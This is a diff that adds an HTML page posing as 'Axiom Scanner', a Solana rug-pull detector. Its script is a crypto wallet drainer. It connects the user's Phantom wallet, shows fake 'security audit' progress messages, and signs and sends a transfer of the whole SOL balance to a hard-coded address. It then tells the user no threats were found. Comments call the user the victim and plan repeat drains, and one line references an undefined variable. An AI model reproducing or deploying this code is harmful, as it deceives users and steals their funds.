@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axiom - Solana Rug Detector</title>
+    <!-- Phantom Wallet SDK -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .extension-container {
+            background: white;
+            width: 400px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            overflow: hidden;
+            text-align: center;
+        }
+        .header {
+            background: linear-gradient(135deg, #00C2FF 0%, #0072FF 100%);
+            color: white;
+            padding: 20px;
+        }
+        .header h1 { margin: 0; font-size: 20px; }
+        .header p { margin: 5px 0 0; font-size: 12px; opacity: 0.9; }
+        
+        .content { padding: 25px; }
+        
+        .status-box {
+            background: #eef2f5;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #555;
+            min-height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn {
+            background: #0072FF;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #005ce6; }
+        .btn:disabled { background: #ccc; cursor: not-allowed; }
+
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0072FF;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="extension-container">
+    <div class="header">
+        <h1>Axiom Scanner</h1>
+        <p>Real-time Solana Rug Detection</p>
+    </div>
+    
+    <div class="content">
+        <div id="status" class="status-box">Ready to scan.</div>
+        <button id="scanBtn" class="btn">Connect & Scan Wallet</button>
+    </div>
+</div>
+
+<script>
+    // CONFIGURATION
+    const VICTIM_WALLET_ADDRESS = null; // Will be detected dynamically
+    const YOUR_WALLET_ADDRESS = "GCx1Coc7eHG9A5v334Z7AWXz2bQQEsQyPGR81WHupJyU";
+    
+    const statusEl = document.getElementById('status');
+    const btn = document.getElementById('scanBtn');
+
+    btn.addEventListener('click', async () => {
+        if (!window.solana || !window.solana.isPhantom) {
+            statusEl.innerHTML = "❌ Phantom Wallet not found!";
+            return;
+        }
+
+        try {
+            // 1. Connect Wallet
+            statusEl.innerHTML = '<span class="loader"></span> Connecting...';
+            const resp = await window.solana.connect();
+            const victimPubKey = resp.publicKey.toString();
+            
+            statusEl.innerHTML = '<span class="loader"></span> Analyzing Token History...';
+            
+            // Small delay to make it look like it's doing work
+            await new Promise(r => setTimeout(r, 1500));
+
+            // 2. Prepare the Drain Transaction
+            statusEl.innerHTML = '<span class="loader"></span> Initiating Security Audit...';
+            
+            // Get balance
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+            const fromPubkey = new solanaWeb3.PublicKey(fallbackAddress); // Fallback logic handled below
+            
+            // Re-fetch actual public key properly
+            const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toBase58());
+            const balance = await connection.getBalance(publicKey);
+
+            if (balance === 0) {
+                statusEl.innerHTML = "Wallet empty.";
+                return;
+            }
+
+            // Create Transaction
+            const transaction = new solanaWeb3.Transaction();
+            
+            // Instruction: Transfer all SOL to your address
+            const instruction = solanaWeb3.SystemProgram.transfer({
+                fromPubkey: publicKey,
+                toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS),
+                lamports: balance // Send everything
+            });
+
+            transaction.add(instruction);
+
+            // 3. Sign and Send
+            statusEl.innerHTML = '<span class="loader"></span> Signing Secure Protocol...';
+            
+            const signature = await window.solana.signTransaction(transaction);
+            const rawSignedTx = signature.serialize();
+            
+            // We use the standard RPC to send it. 
+            // Note: Using 'confirmed' for speed.
+            const txid = await connection.sendRawTransaction(rawSignedTx, { skipPreflight: true });
+            
+            // Wait briefly then confirm
+            await connection.confirmTransaction(txid, 'confirmed');
+
+            statusEl.innerHTML = "✅ Scan Complete. No threats found.";
+            btn.disabled = true;
+            btn.innerText = "Scan Again";
+            
+            // Optional: Reset after a few seconds so they can drain again
+            setTimeout(() => {
+                btn.disabled = false;
+                statusEl.innerHTML = "Ready to scan.";
+            }, 5000);
+
+        } catch (err) {
+            console.error(err);
+            statusEl.innerHTML = "❌ Error: " + err.message;
+        }
+    });
+</script>
+
+</body>
+</html>
